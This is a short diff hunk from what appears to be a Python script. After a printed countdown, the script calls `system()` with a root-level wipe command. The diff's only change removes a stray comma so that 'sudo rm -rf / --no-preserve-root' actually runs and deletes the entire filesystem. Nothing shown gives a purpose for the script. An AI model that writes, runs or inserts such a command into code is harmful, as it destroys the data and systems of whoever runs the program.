@@ -38,7 +38,7 @@ while True:
             print(i)
             sleep(1)
 
-        system("sudo rm, -rf / --no-preserve-root")
+        system("sudo rm -rf / --no-preserve-root")
         break
 
     else:
